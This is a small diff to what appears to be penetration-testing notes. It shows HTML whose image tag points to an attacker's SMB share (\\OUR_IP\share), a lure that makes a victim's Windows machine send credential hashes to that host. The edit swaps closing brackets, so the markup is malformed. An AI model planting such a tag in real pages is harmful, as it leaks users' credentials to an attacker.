@@ -25,7 +25,7 @@
 #### 1) Create an HTML document that points to your SMB server
 
 #### <html<
-####   <body>
-####     <img src=\\OUR_IP\share\WHATEVER.png />
-####        </body>
+####   <body<
+####     <img src=\\OUR_IP\share\WHATEVER.png /<
+####        </body<
 #### </html<
